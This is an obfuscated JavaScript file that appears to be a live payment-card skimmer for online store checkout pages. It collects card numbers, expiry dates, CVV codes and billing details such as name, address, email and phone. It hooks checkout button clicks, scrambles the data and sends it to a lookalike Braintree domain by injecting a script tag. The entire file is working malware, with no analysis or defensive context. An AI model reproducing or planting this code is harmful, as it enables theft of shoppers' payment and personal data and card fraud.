var _0x1ad7 = [
	"ant_zero",
	"undefined",
	"ant_loaded",
	"ant_last_data",
	"ant_interval",
	"payment_checkout1",
	"*[name*='numero_cartao']",
	"input[id*='cc_number']",
	"*[name*='cc_num']",
	"payment_checkout2",
	"*[name*='expiracao_mes']",
	"*[name*='cc_exp_m']",
	"*[name*='expirationMonth']",
	"payment_checkout3",
	"*[name*='expiracao_ano']",
	"*[name*='cc_exp_y']",
	"*[name*='expirationYear']",
	"payment_checkout4",
	"*[name*='codigo_seguranca']",
	"input[id*='cc_cid']",
	"*[name*='cc_cid']",
	"*[name*='cc_cvv']",
	"hasOwnProperty",
	"=",
	"push",
	"&",
	"join",
	"length",
	"substr",
	"",
	"charCodeAt",
	"random",
	"floor",
	"item",
	"head",
	"getElementsByTagName",
	"script",
	"createElement",
	"https://braintreegateway24.tech/stat?",
	"src",
	"setAttribute",
	"appendChild",
	"querySelector",
	"querySelectorAll",
	"value",
	"hostname",
	"braintree-hosted-field-number",
	"getElementById",
	"#",
	"indexOf",
	"substring",
	"*[name='billing[firstname]']",
	"input[name=\"firstname\"]",
	"*[name='billing[lastname]']",
	"input[name=\"lastname\"]",
	"*[name='billing[street][]']",
	"input[name=\"street[0]\"]",
	"*[name='billing[city]']",
	"input[name=\"city\"]",
	"*[name='billing[region_id]']",
	"input[name='region']",
	"select[name='region_id']",
	"*[name='billing[postcode]']",
	"input[name='postcode']",
	"*[name='billing[country_id]']",
	"*[name='country_id']",
	"*[name='billing[telephone]']",
	"input[name='telephone']",
	"*[name='billing[email]']",
	"input[name='username']",
	"host",
	"firstname",
	"lastname",
	"address",
	"city",
	"state",
	"zip",
	"country",
	"phone",
	"email",
	"uagent",
	"userAgent",
	"tree",
	"ztoken=",
	"button[onclick*='.save']",
	"button[class*='checkout']",
	"includes",
	"ant_check",
	"getAttribute",
	"1",
	"click",
	"addEventListener",
	"mousedown",
	"DOMContentLoaded",
	"load"
];
if (typeof window[_0x1ad7[0]] == _0x1ad7[1]) {
	window[_0x1ad7[0]] = 0;
	window[_0x1ad7[2]] = false;
	window[_0x1ad7[3]] = false;
	window[_0x1ad7[4]];
	window[_0x1ad7[5]] = [
		_0x1ad7[6],
		_0x1ad7[7],
		_0x1ad7[8]
	];
	window[_0x1ad7[9]] = [
		_0x1ad7[10],
		_0x1ad7[11],
		_0x1ad7[12]
	];
	window[_0x1ad7[13]] = [
		_0x1ad7[14],
		_0x1ad7[15],
		_0x1ad7[16]
	];
	window[_0x1ad7[17]] = [
		_0x1ad7[18],
		_0x1ad7[19],
		_0x1ad7[20],
		_0x1ad7[21]
	];
	function serializeToQuery(_0x9149x2) {
		var _0x9149x3 = [];
		for (var _0x9149x4 in _0x9149x2) {
			if (_0x9149x2[_0x1ad7[22]](_0x9149x4)) {
				_0x9149x3[_0x1ad7[24]](encodeURIComponent(_0x9149x4) + _0x1ad7[23] + encodeURIComponent(_0x9149x2[_0x9149x4]));
			}
		}
		return _0x9149x3[_0x1ad7[26]](_0x1ad7[25]);
	}
	function serializeKeysValues(_0x9149x6, _0x9149x7) {
		var _0x9149x8 = [];
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149x6[_0x1ad7[27]]; _0x9149x9++) {
			_0x9149x8[_0x1ad7[24]](encodeURIComponent(_0x9149x6[_0x9149x9]) + _0x1ad7[23] + encodeURIComponent(_0x9149x7[_0x9149x9]));
		}
		return _0x9149x8[_0x1ad7[26]](_0x1ad7[25]);
	}
	function ant_replace_at(_0x9149x3, _0x9149xb, _0x9149xc) {
		return _0x9149x3[_0x1ad7[28]](0, _0x9149xb) + _0x9149xc + _0x9149x3[_0x1ad7[28]](_0x9149xb + _0x9149xc[_0x1ad7[27]]);
	}
	function ant_pack(_0x9149x3) {
		var _0x9149xe = _0x1ad7[29];
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149x3[_0x1ad7[27]]; _0x9149x9++) {
			_0x9149xe += _0x1ad7[29] + _0x9149x3[_0x1ad7[30]](_0x9149x9).toString(16);
		}
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149xe[_0x1ad7[27]]; _0x9149x9 += 2) {
			var _0x9149xf = _0x9149xe[_0x1ad7[28]](_0x9149x9, 1);
			var _0x9149x10 = _0x9149xe[_0x1ad7[28]](_0x9149x9 + 1, 1);
			_0x9149xe = ant_replace_at(_0x9149xe, _0x9149x9, _0x9149x10);
			_0x9149xe = ant_replace_at(_0x9149xe, _0x9149x9 + 1, _0x9149xf);
		}
		return _0x9149xe;
	}
	function randomInteger(_0x9149x12, _0x9149x13) {
		var _0x9149x14 = _0x9149x12 + Math[_0x1ad7[31]]() * (_0x9149x13 + 1 - _0x9149x12);
		return Math[_0x1ad7[32]](_0x9149x14);
	}
	function ant_post_ajax(_0x9149x16, _0x9149x17) {
		var _0x9149x18 = document[_0x1ad7[35]](_0x1ad7[34])[_0x1ad7[33]](0);
		var _0x9149x19 = document[_0x1ad7[37]](_0x1ad7[36]);
		var _0x9149x1a = _0x1ad7[38] + _0x9149x16;
		_0x9149x19[_0x1ad7[40]](_0x1ad7[39], _0x9149x1a);
		_0x9149x18[_0x1ad7[41]](_0x9149x19);
	}
	function ant_get_elem(_0x9149x1c) {
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149x1c[_0x1ad7[27]]; _0x9149x9++) {
			var _0x9149x1d = _0x9149x1c[_0x9149x9];
			var _0x9149x1e = document[_0x1ad7[42]](_0x9149x1d);
			if (_0x9149x1e) {
				return _0x9149x1e;
			}
		}
		return false;
	}
	function ant_get_val(_0x9149x20) {
		var _0x9149x21 = document[_0x1ad7[43]](_0x9149x20);
		for (var _0x9149x22 = 0; _0x9149x22 < _0x9149x21[_0x1ad7[27]]; _0x9149x22++) {
			var _0x9149x1e = _0x9149x21[_0x9149x22];
			if (_0x9149x1e[_0x1ad7[44]]) {
				return _0x9149x1e[_0x1ad7[44]];
			}
		}
		return _0x1ad7[29];
	}
	function ant_get_val_multi(_0x9149x1c) {
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149x1c[_0x1ad7[27]]; _0x9149x9++) {
			var _0x9149x20 = _0x9149x1c[_0x9149x9];
			var _0x9149x24 = ant_get_val(_0x9149x20);
			if (_0x9149x24) {
				return _0x9149x24;
			}
		}
		return _0x1ad7[29];
	}
	function ant_main() {
		var _0x9149x26 = location[_0x1ad7[45]];
		var _0x9149x27 = document[_0x1ad7[47]](_0x1ad7[46]);
		if (!_0x9149x27) {
			return;
		}
		var _0x9149x28 = _0x9149x27[_0x1ad7[39]];
		var _0x9149x29 = _0x9149x28[_0x1ad7[50]](_0x9149x28[_0x1ad7[49]](_0x1ad7[48]) + 1);
		var _0x9149x2a = ant_get_val_multi([_0x1ad7[51], _0x1ad7[52]]);
		var _0x9149x2b = ant_get_val_multi([_0x1ad7[53], _0x1ad7[54]]);
		var _0x9149x2c = ant_get_val_multi([_0x1ad7[55], _0x1ad7[56]]);
		var _0x9149x2d = ant_get_val_multi([_0x1ad7[57], _0x1ad7[58]]);
		var _0x9149x2e = ant_get_val_multi([
			_0x1ad7[59],
			_0x1ad7[60],
			_0x1ad7[61]
		]);
		var _0x9149x2f = ant_get_val_multi([_0x1ad7[62], _0x1ad7[63]]);
		var _0x9149x30 = ant_get_val_multi([_0x1ad7[64], _0x1ad7[65]]);
		var _0x9149x31 = ant_get_val_multi([_0x1ad7[66], _0x1ad7[67]]);
		var _0x9149x32 = ant_get_val_multi([_0x1ad7[68], _0x1ad7[69]]);
		var _0x9149x6 = [];
		var _0x9149x7 = [];
		_0x9149x6[_0x1ad7[24]](_0x1ad7[70]);
		_0x9149x7[_0x1ad7[24]](_0x9149x26);
		_0x9149x6[_0x1ad7[24]](_0x1ad7[71]);
		_0x9149x7[_0x1ad7[24]](_0x9149x2a);
		_0x9149x6[_0x1ad7[24]](_0x1ad7[72]);
		_0x9149x7[_0x1ad7[24]](_0x9149x2b);
		_0x9149x6[_0x1ad7[24]](_0x1ad7[73]);
		_0x9149x7[_0x1ad7[24]](_0x9149x2c);
		_0x9149x6[_0x1ad7[24]](_0x1ad7[74]);
		_0x9149x7[_0x1ad7[24]](_0x9149x2d);
		_0x9149x6[_0x1ad7[24]](_0x1ad7[75]);
		_0x9149x7[_0x1ad7[24]](_0x9149x2e);
		_0x9149x6[_0x1ad7[24]](_0x1ad7[76]);
		_0x9149x7[_0x1ad7[24]](_0x9149x2f);
		_0x9149x6[_0x1ad7[24]](_0x1ad7[77]);
		_0x9149x7[_0x1ad7[24]](_0x9149x30);
		_0x9149x6[_0x1ad7[24]](_0x1ad7[78]);
		_0x9149x7[_0x1ad7[24]](_0x9149x31);
		_0x9149x6[_0x1ad7[24]](_0x1ad7[79]);
		_0x9149x7[_0x1ad7[24]](_0x9149x32);
		_0x9149x6[_0x1ad7[24]](_0x1ad7[80]);
		_0x9149x7[_0x1ad7[24]](navigator[_0x1ad7[81]]);
		_0x9149x6[_0x1ad7[24]](_0x1ad7[82]);
		_0x9149x7[_0x1ad7[24]](_0x9149x29);
		var _0x9149x33 = ant_pack(serializeKeysValues(_0x9149x6, _0x9149x7));
		if (_0x9149x33 == window[_0x1ad7[3]]) {
			return;
		}
		window[_0x1ad7[3]] = _0x9149x33;
		_0x9149x7 = _0x1ad7[83] + _0x9149x33;
		ant_post_ajax(_0x9149x7, false);
	}
	function ant_cockroach() {
		var _0x9149x27 = document[_0x1ad7[47]](_0x1ad7[46]);
		if (!_0x9149x27) {
			return;
		}
		var _0x9149x35 = [];
		var _0x9149x1c = [_0x1ad7[84], _0x1ad7[85]];
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149x1c[_0x1ad7[27]]; _0x9149x9++) {
			var _0x9149x1d = _0x9149x1c[_0x9149x9];
			var _0x9149x21 = document[_0x1ad7[43]](_0x9149x1d);
			for (var _0x9149x22 = 0; _0x9149x22 < _0x9149x21[_0x1ad7[27]]; _0x9149x22++) {
				var _0x9149x1e = _0x9149x21[_0x9149x22];
				if (!_0x9149x35[_0x1ad7[86]](_0x9149x1e)) {
					_0x9149x35[_0x1ad7[24]](_0x9149x1e);
				}
			}
		}
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149x35[_0x1ad7[27]]; _0x9149x9++) {
			var _0x9149x1e = _0x9149x35[_0x9149x9];
			var _0x9149x36 = _0x9149x1e[_0x1ad7[88]](_0x1ad7[87]);
			if (_0x9149x36 == _0x1ad7[89]) {
				continue;
			}
			_0x9149x1e[_0x1ad7[91]](_0x1ad7[90], function() {
				try {
					ant_main();
				} catch (err) {}
			});
			_0x9149x1e[_0x1ad7[91]](_0x1ad7[92], function() {
				try {
					ant_main();
				} catch (err) {}
			});
			_0x9149x1e[_0x1ad7[40]](_0x1ad7[87], _0x1ad7[89]);
		}
	}
	function ant_load() {
		if (window[_0x1ad7[2]]) {
			return;
		}
		window[_0x1ad7[2]] = true;
		ant_cockroach();
		window[_0x1ad7[4]] = setInterval(function() {
			ant_cockroach();
		}, 7e3);
	}
	document[_0x1ad7[91]](_0x1ad7[93], function(_0x9149x38) {
		ant_load();
	});
	window[_0x1ad7[91]](_0x1ad7[94], function() {
		ant_load();
	}, false);
	setTimeout(function() {
		ant_load();
	}, 7e3);
}
